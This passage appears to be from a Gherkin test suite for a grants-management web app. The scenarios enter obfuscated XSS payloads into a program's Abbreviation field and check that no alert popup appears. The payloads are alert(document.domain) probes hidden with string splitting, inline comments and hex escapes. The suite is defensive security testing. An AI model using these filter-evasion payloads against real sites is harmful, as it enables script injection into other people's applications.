      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301637 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                   | Field                |
      | ';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301639 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                 | Field                |
      | ';top['ale'+'rt'](top['doc'+'ument']['dom'+'ain']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301640 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                       | Field                |
      | ';parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301642 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                       | Field                |
      | ';frames['ale'+'rt'](frames['doc'+'ument']['dom'+'ain']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301643 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                               | Field                |
      | ';globalThis['ale'+'rt'](globalThis['doc'+'ument']['dom'+'ain']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301645 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                          | Field                |
      | ';window[/*foo*/'alert'/*bar*/](window[/*foo*/'document'/*bar*/]['domain']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301646 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                      | Field                |
      | ';self[/*foo*/'alert'/*bar*/](self[/*foo*/'document'/*bar*/]['domain']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301647 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                      | Field                |
      | ';this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301648 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                    | Field                |
      | ';top[/*foo*/'alert'/*bar*/](top[/*foo*/'document'/*bar*/]['domain']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301649 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                          | Field                |
      | ';parent[/*foo*/'alert'/*bar*/](parent[/*foo*/'document'/*bar*/]['domain']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301650 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                          | Field                |
      | ';frames[/*foo*/'alert'/*bar*/](frames[/*foo*/'document'/*bar*/]['domain']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301651 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                  | Field                |
      | ';globalThis[/*foo*/'alert'/*bar*/](globalThis[/*foo*/'document'/*bar*/]['domain']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301652 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                       | Field                |
      | ';window['\x61\x6c\x65\x72\x74'](window['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301653 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                   | Field                |
      | ';self['\x61\x6c\x65\x72\x74'](self['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301655 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                   | Field                |
      | ';this['\x61\x6c\x65\x72\x74'](this['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301656 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                 | Field                |
      | ';top['\x61\x6c\x65\x72\x74'](top['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301657 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                       | Field                |
      | ';parent['\x61\x6c\x65\x72\x74'](parent['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
